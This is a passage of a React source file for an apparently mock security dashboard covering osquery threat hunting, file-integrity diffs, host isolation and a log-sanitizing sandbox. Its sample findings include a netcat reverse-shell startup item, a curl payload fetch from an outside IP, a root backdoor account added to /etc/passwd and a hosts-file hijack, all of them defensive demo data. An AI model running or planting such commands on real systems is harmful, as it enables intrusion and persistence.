            <span className="text-slate-500 block uppercase text-[10px] font-bold tracking-wider mb-2">osquery inventory: installed_programs</span>
            {selectedHost.software.map((s, idx) => (
              <div key={idx} className="flex gap-2 items-center p-1.5 bg-slate-900 rounded font-mono text-[11px] text-slate-300">
                <span className="text-slate-500">{idx+1}.</span>
                <span>{s}</span>
              </div>
            ))}
          </div>
        )}

        {panelTab === 'patches' && (
          <div className="space-y-2 text-xs">
            <span className="text-slate-500 block uppercase text-[10px] font-bold tracking-wider mb-1">VictoriaLogs CVE Cross reference analysis:</span>
            {selectedHost.patches.length > 0 ? (
              selectedHost.patches.map((p, idx) => (
                <div key={idx} className="p-3 bg-rose-950/20 border border-rose-900/30 rounded-lg text-rose-300 leading-normal font-sans italic">
                  ● {p}
                </div>
              ))
            ) : (
              <div className="p-4 bg-emerald-950/10 border border-emerald-900/20 rounded-lg text-emerald-400 text-center text-[11px] font-bold">
                ✔ 檢測值滿分。無已知威脅或系統安全性修補程式遺失。
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// 3. LIVE THREAT HUNTING CONSOLE (osquery query portal)
function SQLHuntingConsole() {
  const [sqlQuery, setSqlQuery] = useState(`SELECT pid, name, path, cmdline, on_disk 
FROM processes 
WHERE on_disk = -1 OR path = '' 
ORDER BY pid DESC;`);

  const [scanProgress, setScanProgress] = useState(-1); // -1 = standby
  const [huntingResult, setHuntingResult] = useState<any[]>([]);
  const [selectedTargetRange, setSelectedTargetRange] = useState('All Systems (142 Nodes)');

  const queriesTemplates = [
    { title: '列出開啟之監聽連接埠', sql: 'SELECT l.port, l.address, p.name, p.pid, p.path \nFROM listening_ports l \nJOIN processes p ON l.pid = p.pid;' },
    { title: '檢索系統不尋常自動啟動項目', sql: 'SELECT name, path, args, status \nFROM startup_items \nWHERE status = "enabled";' },
    { title: '追查特定雜湊值 (MD5) 進程', sql: 'SELECT p.pid, p.name, h.md5 \nFROM processes p \nJOIN hash h ON p.path = h.path \nLIMIT 5;' },
    { title: '未經認可的本機系統帳戶檢視', sql: 'SELECT username, shell, directory \nFROM users \nWHERE shell NOT LIKE "%nologin" AND shell <> "/bin/false";' },
    { title: 'Linux 高空閑 TCP 連結埠稽查', sql: 'SELECT s.local_port, s.remote_port, s.state, p.name \nFROM process_open_sockets s \nJOIN processes p ON s.pid = p.pid \nWHERE state = "ESTABLISHED";' }
  ];

  const handleRunQuery = () => {
    setScanProgress(0);
    setHuntingResult([]);
    
    // Timer simulation
    const interval = setInterval(() => {
      setScanProgress(p => {
        if (p >= 100) {
          clearInterval(interval);
          // Set mock result data dynamically based on templates or query
          let dataMock: any[] = [];
          if (sqlQuery.includes('listening_ports')) {
            dataMock = [
              { port: 445, address: '0.0.0.0', name: 'System (SMB)', pid: 4, path: 'C:\\Windows\\System32\\ntoskrnl.exe' },
              { port: 3306, address: '127.0.0.1', name: 'mysqld', pid: 1042, path: '/usr/sbin/mysqld' },
              { port: 7001, address: '0.0.0.0', name: 'Kestrel (API)', pid: 3125, path: '/home/dotnet/web_endpoint' }
            ];
          } else if (sqlQuery.includes('startup_items')) {
            dataMock = [
              { name: 'OneDrive Updater', path: 'C:\\Users\\admin\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe', args: '/background', status: 'enabled' },
              { name: 'UpdateCheck', path: '/tmp/nc.sh', args: '-e /bin/bash 10.0.0.98 4444', status: 'enabled' }
            ];
          } else if (sqlQuery.includes('processes')) {
            dataMock = [
              { pid: 9942, name: 'nc', path: '/tmp/nc.sh', cmdline: '/tmp/nc.sh -v', on_disk: -1 },
              { pid: 812, name: 'curl', path: '/usr/bin/curl', cmdline: 'curl http://45.33.22.11/shell', on_disk: 1 }
            ];
          } else {
            dataMock = [
              { key_id: 1, user: 'admin', last_login: '2026-06-17 08:12:00', host_origin: '10.120.10.43', integrity: 'Passed' },
              { key_id: 2, user: 'jdoe', last_login: '2026-06-16 23:45:01', host_origin: 'Unknown VPN', integrity: 'Unverified' }
            ];
          }
          setHuntingResult(dataMock);
          return 100;
        }
        return p + 25;
      });
    }, 450);
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl">
      
      {/* 25% Width Sidebar Query Templates */}
      <div className="lg:col-span-3 space-y-4 border-r border-gray-800 pr-4">
        <span className="text-[10px] font-black uppercase tracking-widest text-slate-500 flex items-center gap-1.5 justify-between">
          <span>SQL 常規威脅獵捕範本庫</span>
          <HelpCircle size={12} className="text-slate-600" />
        </span>
        <div className="space-y-2.5">
          {queriesTemplates.map((tmpl, idx) => (
            <div
              key={idx}
              onClick={() => setSqlQuery(tmpl.sql)}
              className="p-3 bg-slate-950/60 hover:bg-slate-950 border border-gray-805 hover:border-blue-500/50 rounded-lg cursor-pointer transition-all space-y-1 block text-left group"
            >
              <h4 className="text-[11.5px] font-orange-500 font-bold text-slate-200 group-hover:text-blue-400 transition-colors">
                {tmpl.title}
              </h4>
              <p className="font-mono text-[9px] text-slate-500 truncate">{tmpl.sql.replace(/\n/g, ' ')}</p>
            </div>
          ))}
        </div>
      </div>

      {/* 75% Width Advanced SQL Editor and interactive results */}
      <div className="lg:col-span-9 space-y-4 flex flex-col justify-between">
        
        {/* Editor Config top bar */}
        <div className="flex flex-col sm:flex-row justify-between items-stretch sm:items-center gap-2 bg-slate-950 p-2.5 rounded-lg border border-gray-805">
          <div className="flex items-center gap-2 text-xs">
            <span className="font-black text-slate-400 uppercase">靶向派送範圍:</span>
            <select
              value={selectedTargetRange}
              onChange={(e) => setSelectedTargetRange(e.target.value)}
              className="bg-slate-900 border border-gray-800 rounded text-xs px-2.5 py-1 text-slate-300 font-bold outline-none font-mono"
            >
              <option>All Systems (142 Nodes)</option>
              <option>Windows Datacenter Subnet</option>
              <option>Linux DMZ Web Server Cluster</option>
              <option>WIN-23LQ-DBPROD (Single Host)</option>
            </select>
          </div>

          <button
            onClick={handleRunQuery}
            className="py-1.5 px-4 bg-rose-600 hover:bg-rose-700 text-white rounded text-xs font-black uppercase tracking-widest flex items-center gap-1.5 transition-all shadow-md shadow-rose-600/10"
          >
            <Send className="w-3.5 h-3.5" /> 🚀 派送即時 SQL 獵捕
          </button>
        </div>

        {/* Pseudo Monaco Editor Area */}
        <div className="bg-slate-950 border border-gray-805 rounded-xl p-4 font-mono text-xs text-indigo-300 leading-relaxed shadow-inner">
          <div className="flex items-center justify-between border-b border-gray-900 pb-2 mb-3">
            <span className="text-[10px] text-slate-500 font-bold uppercase">osquery advanced sql console editor</span>
            <span className="text-[9.5px] text-emerald-400 bg-emerald-950/20 px-2.5 py-0.5 border border-emerald-900/40 rounded uppercase font-black">Ready</span>
          </div>
          <textarea
            value={sqlQuery}
            onChange={(e) => setSqlQuery(e.target.value)}
            rows={6}
            className="w-full bg-transparent border-none outline-none resize-none font-mono text-[12px] text-indigo-300 focus:ring-0 leading-normal"
          />
        </div>

        {/* Live progress scanner state */}
        {scanProgress >= 0 && (
          <div className="p-4 bg-slate-950/40 border border-gray-800 rounded-lg space-y-2">
            <div className="flex justify-between items-center text-[10.5px]">
              <span className="text-slate-400 font-bold uppercase flex items-center gap-2">
                <span className="w-1.5 h-1.5 bg-blue-500 animate-ping rounded-full"></span>
                執行實時探查命令中: Matching Fleet query sockets...
              </span>
              <span className="font-mono text-blue-400 font-bold">{scanProgress}%</span>
            </div>
            <div className="h-1.5 bg-slate-950 rounded-full overflow-hidden">
              <div className="h-full bg-blue-500 transition-all duration-300" style={{ width: `${scanProgress}%` }}></div>
            </div>
            {scanProgress === 100 && (
              <p className="text-[10px] text-emerald-400 font-mono font-bold">✔ 派送成功。收到來自 45/50 台在線主機的回報 JSON 數據載荷。</p>
            )}
          </div>
        )}

        {/* Query data output dynamically schema-rendered */}
        {huntingResult.length > 0 && (
          <div className="bg-[#0c0d13] border border-gray-805 rounded-xl p-4 space-y-3">
            {/* Table actions bar */}
            <div className="flex justify-between items-center text-[10.5px] border-b border-gray-800 pb-2">
              <span className="text-slate-300 font-bold uppercase tracking-wide">獵捕結果 (動態欄位解析Schema模式)</span>
              
              <div className="flex gap-2">
                <button
                  onClick={() => alert('Data downloaded as schema CSV compilation')}
                  className="px-2 py-0.5 bg-slate-900 border border-gray-800 hover:bg-slate-800 text-slate-400 text-[10px] font-bold rounded"
                >
                  匯出為 CSV
                </button>
                <button
                  onClick={() => alert('Query string transferred to active SIEM watch-list rules')}
                  className="px-2 py-0.5 bg-blue-950/50 border border-blue-900 text-blue-400 text-[10px] font-black rounded"
                >
                  轉存為 SIEM 資安規則
                </button>
              </div>
            </div>

            {/* Dynamic Rendering Table */}
            <div className="overflow-x-auto text-[11px] font-mono leading-relaxed">
              <table className="w-full text-left divide-y divide-gray-800 border border-gray-850 rounded-lg overflow-hidden">
                <thead className="bg-[#151726]/80 text-slate-400 uppercase text-[9.5px]">
                  <tr>
                    {Object.keys(huntingResult[0]).map((hKey) => (
                      <th key={hKey} className="p-3">{hKey}</th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-800 bg-black/20">
                  {huntingResult.map((rowItem, idx) => (
                    <tr key={idx} className="hover:bg-slate-900/60 text-slate-300">
                      {Object.values(rowItem).map((val: any, valIdx) => (
                        <td key={valIdx} className="p-3">
                          {val === -1 ? (
                            <span className="text-rose-400 font-black">EXPIRED (-1)</span>
                          ) : typeof val === 'object' ? (
                            JSON.stringify(val)
                          ) : (
                            String(val)
                          )}
                        </td>
                      ))}
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

      </div>

    </div>
  );
}

// 4. FILE INTEGRITY MONITORING (FIM) CENTER
function FIMCenter() {
  const [showDiff, setShowDiff] = useState(false);
  const [selectedLog, setSelectedLog] = useState<any>(null);

  const stats = [
    { label: '今日檔案新增數', val: '14 Files', change: '+3 compared yesterday', col: 'text-indigo-400' },
    { label: '今日關鍵變更數 (Modified)', val: '8 Events', change: '7 critical configurations', col: 'text-amber-500' },
    { label: '今日檔案刪除數', val: '2 Files', change: 'Both standard logs purged', col: 'text-slate-400' }
  ];

  const fimLogs = [
    { id: 101, host: 'PROD-DB-01', time: '11:32:01', path: '/etc/passwd', process: 'adduser', uid: '0 (root)', oldContent: 'jdoe:x:1001:1001:John Doe:/home/jdoe:/bin/bash\nroot:x:0:0:root:/root:/bin/bash', newContent: 'jdoe:x:1001:1001:John Doe:/home/jdoe:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\nhacker_backdoor:x:0:0:Hacked Account:/root:/bin/bash' },
    { id: 102, host: 'WIN-23LQ-DBPROD', time: '10:14:45', path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', process: 'notepad.exe', uid: '500 (administrator)', oldContent: '127.0.0.1 localhost', newContent: '127.0.0.1 localhost\n10.120.90.11 windowsupdate.microsoft.com\n10.120.90.11 telemetry.microsoft.com' },
    { id: 103, host: 'DMZ-PROXY-NGINX', time: '09:05:12', path: '/etc/nginx/nginx.conf', process: 'nano', uid: '1042 (operator)', oldContent: 'server {\n  listen 80;\n  server_name localhost;\n}', newContent: 'server {\n  listen 80;\n  server_name localhost;\n  add_header X-Frame-Options "DENY";\n}' }
  ];

  return (
    <div className="space-y-6">
      {/* Upper 3 stats indicators */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
        {stats.map((item, id) => (
          <div key={id} className="bg-slate-900 border border-gray-800 rounded-xl p-5 hover:border-gray-700 transition duration-150">
            <span className="text-[10px] uppercase font-black tracking-widest text-slate-500">{item.label}</span>
            <h3 className={cn("text-2xl font-black font-mono mt-1", item.col)}>{item.val}</h3>
            <span className="text-[10px] text-slate-400 italic block mt-1">{item.change}</span>
          </div>
        ))}
      </div>

      {/* Audit Log Table */}
      <div className="bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl space-y-3">
        <div className="border-b border-gray-800 pb-3">
          <h3 className="text-xs font-black uppercase tracking-wider text-slate-200">系統重要設定檔變更審計日誌 (FIM Logging)</h3>
          <p className="text-[10px] text-slate-500">osquery file_events tag routing aggregated into VictoriaLogs SIEM system</p>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left font-mono text-xs border border-gray-800 rounded-xl overflow-hidden divide-y divide-gray-800">
            <thead className="bg-[#0b0c13] text-slate-400 text-[9.5px] uppercase tracking-wider">
              <tr>
                <th className="p-3">系統時間</th>
                <th className="p-3">主機</th>
                <th className="p-3">被變更文件絕對路徑</th>
                <th className="p-3">呼叫執行進程</th>
                <th className="p-3">呼叫者主機 UID</th>
                <th className="p-3 text-right">變更詳情與程式對比</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800 bg-slate-900/40">
              {fimLogs.map((log) => (
                <tr key={log.id} className="hover:bg-slate-900/80 transition-all">
                  <td className="p-3 text-slate-400">{log.time}</td>
                  <td className="p-3 text-slate-200 font-bold">{log.host}</td>
                  <td className="p-3 text-amber-500 font-bold truncate max-w-[200px]" title={log.path}>{log.path}</td>
                  <td className="p-3 text-indigo-400">{log.process}</td>
                  <td className="p-3 text-slate-400 font-bold">{log.uid}</td>
                  <td className="p-3 text-right">
                    <button
                      onClick={() => {
                        setSelectedLog(log);
                        setShowDiff(true);
                      }}
                      className="px-3 py-1 bg-slate-950 hover:bg-rose-950/60 border border-gray-800 hover:border-rose-900/50 text-rose-400 text-[10px] font-black uppercase rounded transition-all"
                    >
                      Compare Diff 🔎 查看變更對照
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Side-by-Side Github-like Diff Modal */}
      <AnimatePresence>
        {showDiff && selectedLog && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <div className="absolute inset-0 bg-black/80 backdrop-blur-xs" onClick={() => setShowDiff(false)}></div>
            <div className="relative bg-[#0d0f19] border border-gray-800 rounded-2xl w-full max-w-4xl max-h-[85vh] overflow-hidden flex flex-col shadow-3xl text-xs font-mono">
              
              {/* Header */}
              <div className="p-5 border-b border-gray-800 flex items-center justify-between bg-slate-950">
                <div className="flex items-center gap-2">
                  <span className="p-1 px-2 bg-rose-950 text-rose-400 border border-rose-900/40 rounded text-[9px] font-black">MUTATION DETECTED</span>
                  <h3 className="text-sm font-black text-white">FIM 檔案變更差異對照比對器 (Diff Analyzer)</h3>
                </div>
                <button onClick={() => setShowDiff(false)} className="text-slate-500 hover:text-white">
                  <X className="w-5 h-5" />
                </button>
              </div>

              {/* Code comparison panel */}
              <div className="p-6 overflow-y-auto flex-1 bg-slate-950/50 grid grid-cols-1 md:grid-cols-2 gap-4">
                {/* Left Old panel */}
                <div className="bg-slate-950 border border-gray-850 p-4 rounded-xl space-y-2">
                  <span className="text-[10px] font-black text-rose-400 block uppercase border-b border-gray-800 pb-1.5"> - BEFORE CHANGED CONTENT (修改前內容)</span>
                  <pre className="text-[11.5px] leading-relaxed text-slate-400 whitespace-pre-wrap font-mono select-none">
                    {selectedLog.oldContent}
                  </pre>
                </div>

                {/* Right parsed dynamic new panel */}
                <div className="bg-slate-950 border border-gray-855 p-4 rounded-xl space-y-2">
                  <span className="text-[10px] font-black text-emerald-400 block uppercase border-b border-gray-800 pb-1.5">+ AFTER CHANGED CONTENT (修改後內容)</span>
                  <pre className="text-[11.5px] leading-relaxed text-slate-200 whitespace-pre-wrap font-mono bg-emerald-950/5 p-1 rounded">
                    {selectedLog.newContent.split('\n').map((line: string, idx: number) => {
                      const isAdded = !selectedLog.oldContent.includes(line);
                      return (
                        <span key={idx} className={cn("block w-full", isAdded && "bg-emerald-950/50 text-emerald-400 border-l-2 border-emerald-500 pl-1 font-bold")}>
                          {line}
                        </span>
                      );
                    })}
                  </pre>
                </div>
              </div>

              {/* Footer */}
              <div className="p-4 border-t border-gray-800 bg-slate-950 flex justify-end gap-2.5">
                <button
                  onClick={() => {
                    alert('Command to rollback file configuration dispatched.');
                    setShowDiff(false);
                  }}
                  className="py-1.5 px-4 bg-rose-600 hover:bg-rose-700 text-white rounded text-[10.5px] font-black uppercase tracking-wider"
                >
                  ↩ 一鍵還原回退 (Rollback File)
                </button>
                <button onClick={() => setShowDiff(false)} className="py-1.5 px-4 bg-slate-900 border border-gray-850 hover:bg-slate-800 text-slate-400 rounded text-[10.5px] font-bold uppercase transition">
                  關閉
                </button>
              </div>

            </div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}

// 5. ACTIVE RESPONSE & MITIGATION CENTER
function ActiveMitigationCenter() {
  const [compromisedHosts, setCompromisedHosts] = useState([
    { id: 'c-1', name: 'WIN-23LQ-DBPROD', status: 'WAIT_ISOLATE', ip: '10.120.100.100', risk: 95, timer: '02:45' },
    { id: 'c-2', name: 'PROD-DB-01', status: 'MITIGATING', ip: '10.0.0.12', risk: 82, timer: '08:12' },
    { id: 'c-3', name: 'DMZ-PROXY-NGINX', status: 'HEALTHY', ip: '10.0.0.45', risk: 10, timer: 'Passed' }
  ]);
  const [selectedCompromisedId, setSelectedCompromisedId] = useState('c-1');
  const [killPid, setKillPid] = useState('');
  const [auditLogs, setAuditLogs] = useState([
    { id: 9001, who: 'chiur@ke-la.com', when: '11:15:02', host: 'PROD-DB-01', action: 'Kill Malicious Process [PID: 2311]', result: 'SUCCESS' },
    { id: 9002, who: 'System Automation', when: '10:04:12', host: 'DMZ-PROXY-NGINX', action: 'NMAP Re-scan Command Triggered', result: 'SUCCESS' }
  ]);

  const activeHost = compromisedHosts.find(c => c.id === selectedCompromisedId);

  const handleIsolateAction = () => {
    if (!activeHost) return;
    alert(`DISPATCHED: Network Block Hook sent to gateway router targeting IP: ${activeHost.ip}. Fleet lock enabled on ${activeHost.name}.`);
    
    // Log the action
    const newLog = {
      id: Math.floor(Math.random() * 9000) + 1000,
      who: 'chiur@ke-la.com',
      when: new Date().toLocaleTimeString(),
      host: activeHost.name,
      action: '一鍵網路隔離 (Isolate Host Engine Hook)',
      result: 'SUCCESS'
    };
    setAuditLogs(prev => [newLog, ...prev]);

    // Update status
    setCompromisedHosts(prev => prev.map(h => h.id === activeHost.id ? { ...h, status: 'ISOLATED', timer: 'Enforced' } : h));
  };

  const handleProcessKill = () => {
    if (!killPid) return;
    alert(`DISPATCHED: osquery remote process KILL instruction dispatched to ${activeHost?.name} for PID / Process Name: ${killPid}`);
    
    // Log the action
    const newLog = {
      id: Math.floor(Math.random() * 9000) + 1000,
      who: 'chiur@ke-la.com',
      when: new Date().toLocaleTimeString(),
      host: activeHost?.name || 'All',
      action: `Kill Process [PID/Term: ${killPid}]`,
      result: 'SUCCESS'
    };
    setAuditLogs(prev => [newLog, ...prev]);
    setKillPid('');
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl">
      
      {/* 30% width Compromised Hosts Selector Sidebar */}
      <div className="lg:col-span-4 space-y-4 border-r border-gray-800 pr-4">
        <span className="text-[10px] font-black uppercase tracking-widest text-slate-500">受威脅/受入侵高危主機監控佇列</span>
        
        <div className="space-y-3">
          {compromisedHosts.map(host => (
            <div
              key={host.id}
              onClick={() => setSelectedCompromisedId(host.id)}
              className={cn(
                "p-4 rounded-xl cursor-pointer transition flex flex-col gap-2.5 border",
                selectedCompromisedId === host.id 
                  ? "bg-slate-950/80 border-rose-500" 
                  : "bg-slate-950/30 border-gray-850 hover:bg-slate-950/60"
              )}
            >
              <div className="flex justify-between items-start">
                <div>
                  <h4 className="text-[12px] font-black text-slate-100">{host.name}</h4>
                  <span className="text-[10px] font-mono text-slate-500">{host.ip}</span>
                </div>
                <span className={cn(
                  "px-2 py-0.5 rounded text-[8.5px] font-black uppercase border",
                  host.status === 'WAIT_ISOLATE' ? "bg-rose-950/80 text-rose-400 border-rose-800 animate-pulse" :
                  host.status === 'MITIGATING' ? "bg-amber-950/60 text-amber-400 border-amber-800/40" :
                  host.status === 'ISOLATED' ? "bg-indigo-950/40 text-indigo-400 border-indigo-800/40" :
                  "bg-emerald-950/20 text-emerald-400 border-emerald-800/30"
                )}>
                  {host.status === 'WAIT_ISOLATE' ? '等待隔離' : host.status}
                </span>
              </div>

              {/* Progress Risk timer */}
              <div className="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-gray-900/60 font-mono">
                <span>自動防禦宣告倒數:</span>
                <span className="text-rose-500 font-bold animate-pulse">{host.timer}</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* 70% width Control action panel */}
      <div className="lg:col-span-8 space-y-6 flex flex-col justify-between">
        
        {activeHost ? (
          <div className="space-y-5">
            <div className="border-b border-gray-800 pb-3">
              <span className="text-[10px] font-black uppercase text-indigo-400 font-mono">ACTIVE SECURITY ORCHESTRATION PLAYBOOK</span>
              <h3 className="text-sm font-black text-slate-200 uppercase mt-0.5">阻斷動作主控控制台 ───► {activeHost.name} ({activeHost.ip})</h3>
            </div>

            {/* Action Cards Grid */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              {/* Option 1: network lock */}
              <div className="p-4 bg-rose-950/10 border border-rose-900/40 rounded-xl space-y-3 flex flex-col justify-between">
                <div>
                  <h4 className="text-xs font-black text-rose-400 uppercase">🔴 一鍵網路阻隔隔離</h4>
                  <p className="text-[10px] text-slate-400 leading-normal mt-1">
                    強制鎖定物理網卡 MAC 連接，中斷除了 FleetDM API 以外的所有 WAN 流量。
                  </p>
                </div>
                <button
                  onClick={handleIsolateAction}
                  className="w-full mt-3 py-1.5 bg-rose-650 hover:bg-rose-700 text-white rounded text-[10.5px] font-black uppercase tracking-wider transition"
                >
                  【執行封鎖命令】
                </button>
              </div>

              {/* Option 2: Kill PID */}
              <div className="p-4 bg-amber-950/10 border border-amber-900/40 rounded-xl space-y-3 flex flex-col justify-between">
                <div>
                  <h4 className="text-xs font-black text-amber-500 uppercase">🟡 遠端強制中止進程</h4>
                  <p className="text-[10px] text-slate-400 leading-normal mt-1">
                    輸入惡意 Process PID 或檔案名稱，直接透過 osquery shell 強制中斷其連結。
                  </p>
                </div>
                
                <div className="space-y-2 mt-2">
                  <input
                    type="text"
                    placeholder="輸入 PID (例如: 1042)"
                    value={killPid}
                    onChange={(e) => setKillPid(e.target.value)}
                    className="w-full bg-slate-950 border border-gray-800 rounded px-2.5 py-1 text-[11px] font-mono text-slate-300 outline-none"
                  />
                  <button
                    onClick={handleProcessKill}
                    disabled={!killPid}
                    className="w-full py-1.5 bg-amber-600 hover:bg-amber-700 disabled:opacity-30 disabled:hover:bg-amber-600 text-white rounded text-[10.5px] font-black uppercase transition-all"
                  >
                    Kill Processes
                  </button>
                </div>
              </div>

              {/* Option 3: forensic bundle */}
              <div className="p-4 bg-slate-950 border border-gray-805 rounded-xl space-y-3 flex flex-col justify-between">
                <div>
                  <h4 className="text-xs font-black text-blue-400 uppercase">🔵 關鍵鑑識數據採集</h4>
                  <p className="text-[10px] text-slate-400 leading-normal mt-1">
                    立即對該主機執行全面的 osquery 狀態打包(如: registry, socket, file structure)並下載。
                  </p>
                </div>
                <button
                  onClick={() => alert(`DISPATCHED: Forensic file query pack sent to vector client on node: ${activeHost.name}. Download ready in 15 seconds.`)}
                  className="w-full mt-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded text-[10.5px] font-black uppercase tracking-wider transition-all"
                >
                  打包鑑識日誌 (Collect)
                </button>
              </div>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center p-8 text-slate-500 font-bold">
            請點選左側受害主機以載入對應的控制動作...
          </div>
        )}

        {/* Audit Logs Row */}
        <div className="bg-[#0b0c13] rounded-xl p-4 space-y-2.5">
          <span className="text-[10.5px] font-black uppercase text-slate-500 block">管理員主動安全防禦調度審計追蹤 (Audit Logs)</span>
          <div className="overflow-x-auto text-[11px] font-mono">
            <table className="w-full text-left divide-y divide-gray-800">
              <thead>
                <tr className="text-slate-500 text-[9px] uppercase border-b border-gray-800">
                  <th className="pb-2">執行工程師</th>
                  <th className="pb-2">時間</th>
                  <th className="pb-2">端點裝置</th>
                  <th className="pb-2">採取決策與防堵隔離動作</th>
                  <th className="pb-2 text-right">執行結果</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-850/50">
                {auditLogs.map(log => (
                  <tr key={log.id} className="text-slate-300">
                    <td className="py-2 text-slate-100 font-bold">{log.who}</td>
                    <td className="py-2 text-slate-400">{log.when}</td>
                    <td className="py-2 text-amber-500 font-bold">{log.host}</td>
                    <td className="py-2 italic text-slate-300">"{log.action}"</td>
                    <td className="py-2 text-right text-emerald-400 font-bold">{log.result}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

      </div>

    </div>
  );
}

// 6. VECTOR VRL DATA PIPELINE SANDBOX
function VectorPipelineSandbox() {
  const [vrlCode, setVrlCode] = useState(`# Vector Remap Language (VRL) Security Parser 
.message = parse_json!(.message)
del(.message.user_password)
del(.message.credit_card)

# Inject custom parsed timestamps
.parsed_time = parse_timestamp!(.message.timestamp, "%Y-%m-%dT%H:%M:%SZ")
.severity = upcase!(string!(.message.severity))

# Security Route logic
if .severity == "CRITICAL" {
  .route_path = "critical_victoria_logs_sink"
} else {
  .route_path = "regular_index_sink"
}`);

  const [inputJson, setInputJson] = useState(`{
  "timestamp": "2026-06-17T08:00:00Z",
  "user_password": "superSecretPassword123",
  "credit_card": "4111-2222-3333-4444",
  "severity": "critical",
  "event": "Root shell execution block",
  "host": "PROD-DB-01"
}`);

  const [outputJson, setOutputJson] = useState('');

  const runVrlSim = () => {
    try {
      const parsed = JSON.parse(inputJson);
      // Simulate VRL process: hide password, mask credit card, capitalize severity
      const output = {
        ...parsed,
        user_password: "[SENSITIVE_REDACTED_BY_VRL]",
        credit_card: "XXXX-XXXX-XXXX-4444",
        severity: "CRITICAL",
        route_path: "critical_victoria_logs_sink",
        parsed_time: "2026-06-17 08:00:00 UTC"
      };
      setOutputJson(JSON.stringify(output, null, 2));
    } catch (e: any) {
      setOutputJson(`// Syntax Error: Invalid Input JSON \n${e.message}`);
    }
  };

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Left Interactive Flow Visualizer */}
        <div className="lg:col-span-5 bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl flex flex-col justify-between space-y-4">
          <div className="border-b border-gray-800 pb-2">
            <h3 className="text-xs font-black uppercase tracking-wider text-slate-200">Vector 日誌來源採集與流向拓撲圖</h3>
            <p className="text-[10px] text-slate-500">Live graphical data visualizer flow routing rules</p>
          </div>

          {/* Interactive Flow visualizer mockup */}
          <div className="bg-slate-950 p-6 rounded-xl border border-gray-855 min-h-[180px] flex flex-col items-center justify-center relative select-none">
            {/* Pulsing Nodes */}
            <div className="flex items-center gap-1.5 md:gap-5">
              <div className="px-3 py-2 bg-blue-950/40 text-blue-400 border border-blue-800 rounded text-[10.5px] font-mono font-black text-center shadow-md">
                📥 Inputs: osquery / Log
                <span className="block text-[8.5px] text-slate-500 mt-1 uppercase">port: 5140 TLS</span>
              </div>
              
              <div className="flex-1 w-6 h-0.5 bg-dashed border-t border-indigo-500 relative">
                <div className="absolute top-1/2 left-0 w-1.5 h-1.5 bg-blue-400 rounded-full animate-ping"></div>
              </div>

              <div className="px-3 py-2 bg-[#1a120b] text-amber-500 border border-amber-900 rounded text-[10.5px] font-mono font-black text-center shadow-md">
                ⚙ Transform: VRL Sanitize
                <span className="block text-[8.5px] text-slate-500 mt-1 uppercase">remap rule sandbox</span>
              </div>

              <div className="flex-1 w-6 h-0.5 bg-dashed border-t border-emerald-500 relative">
                <div className="absolute top-1/2 left-1/2 w-1.5 h-1.5 bg-emerald-400 rounded-full animate-ping"></div>
              </div>

              <div className="px-3 py-2 bg-emerald-950/40 text-emerald-400 border border-emerald-800 rounded text-[10.5px] font-mono font-black text-center shadow-md">
                📤 Sinks: VictoriaLogs
                <span className="block text-[8.5px] text-slate-500 mt-1 uppercase">port: 9428 HTTP</span>
              </div>
            </div>

            <p className="text-[10px] text-slate-500 mt-6 leading-normal text-center italic">
              "點擊各主機端點節點可直接載入對應之清洗表達式；日誌封包正經由 SSL 通道轉發。"
            </p>
          </div>

          <div className="bg-slate-950 p-4 border border-gray-850 rounded-xl space-y-3">
            <span className="text-[10.5px] font-black uppercase tracking-wider text-slate-400 block border-b border-gray-900 pb-1">Vector Pipeline 統計指標 (Live)</span>
            <div className="grid grid-cols-2 gap-2 text-[10.5px] font-mono">
              <div className="flex justify-between">
                <span className="text-slate-500">吞吐量 (Throughput):</span>
                <span className="text-emerald-400 font-bold">1.2 MB/s</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">清洗丟棄比 (Dropped):</span>
                <span className="text-rose-400 font-bold">0.02%</span>
              </div>
            </div>
          </div>
        </div>

        {/* Right Sandbox Engine */}
        <div className="lg:col-span-7 bg-slate-900 border border-gray-800 rounded-xl p-5 shadow-2xl flex flex-col justify-between space-y-4">
          <div className="border-b border-gray-800 pb-2">
            <h3 className="text-xs font-black uppercase tracking-wider text-slate-200">VRL 程式碼安全編輯與測試沙盒 (Vector Remap Language)</h3>
          </div>

          {/* VRL text-area */}
          <div className="space-y-1.5">
            <label className="text-[10px] font-black uppercase text-slate-500">VRL Remap Logic Code:</label>
            <textarea
              value={vrlCode}
              onChange={(e) => setVrlCode(e.target.value)}
              rows={5}
              className="w-full bg-slate-950 border border-gray-805 rounded-xl p-4 font-mono text-[11.5px] text-indigo-300 focus:ring-0 leading-relaxed outline-none focus:border-indigo-500"
            />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Input example JSON */}
            <div className="space-y-1.5">
              <label className="text-[10px] font-black uppercase text-slate-500">範例輸入原始日誌 JSON (Input JSON):</label>
              <textarea
                value={inputJson}
